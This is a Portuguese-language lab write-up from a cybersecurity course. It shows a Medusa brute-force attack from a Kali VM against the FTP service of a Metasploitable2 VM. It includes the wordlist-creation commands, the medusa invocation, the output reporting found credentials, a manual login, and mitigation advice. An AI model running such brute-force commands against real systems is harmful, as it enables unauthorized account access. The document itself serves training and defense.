# DIO-Santander-Ciberseguranca
Simulando Ataques de Força Bruta com Medusa (Kali → Metasploitable2)
Resumo

Projeto prático que simula ataques de força bruta em um ambiente controlado usando Medusa (Kali Linux atacando Metasploitable2). Documenta ambiente, comandos, wordlists simples, evidências e recomendações.

Ambiente de teste

Host: VirtualBox (Host-Only)

VM Atacante: Kali Linux — 192.168.56.102

VM alvo: Metasploitable2 — 192.168.56.101

Observação: este teste foi executado apenas em laboratório controlado (Metasploitable2).

Arquivos de wordlists / usuários usados

No laboratório criei dois arquivos simples:

Criar users.txt:
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

Criar pass.txt:
echo -e "123456\nmsfadmin\nqwerty\npassword" > pass.txt

Conteúdo (visível nos prints):

users.txt:

user
msfadmin
admin
root


pass.txt:

123456
msfadmin
qwerty
password

Comando utilizado (Medusa)

Executado a partir do Kali:

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6


-h host alvo

-U arquivo de usuários

-P arquivo de senhas

-M ftp módulo FTP

-t 6 threads

Resultado observado (evidências)

Durante a execução, o Medusa testou combinações e retornou uma credencial encontrada:

Exemplo de linha capturada na saída do Medusa (print):
2025-10-21 00:11:24 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

Após isso, foi possível acessar o serviço FTP manualmente:

ftp 192.168.56.101
# Quando solicitado:
Name (192.168.56.101:cyber): msfadmin
Password: msfadmin
# Mensagem:
230 Login successful.


Recomendações e Mitigações (resumo)

Desabilitar FTP se não for necessário; usar SFTP/FTPS.

Implementar bloqueio de conta ou bloqueio por IP após N tentativas falhas.

Forçar senhas fortes e políticas de expiração.

Monitorar logs de autenticação e alertar tentativas suspeitas.

Segmentar serviços (SMB/FTP) para redes internas apenas.

Como salvar logs (exemplo)
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 2>&1 | tee outputs/medusa_ftp.txt
script -c "medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6" outputs/medusa_session.txt
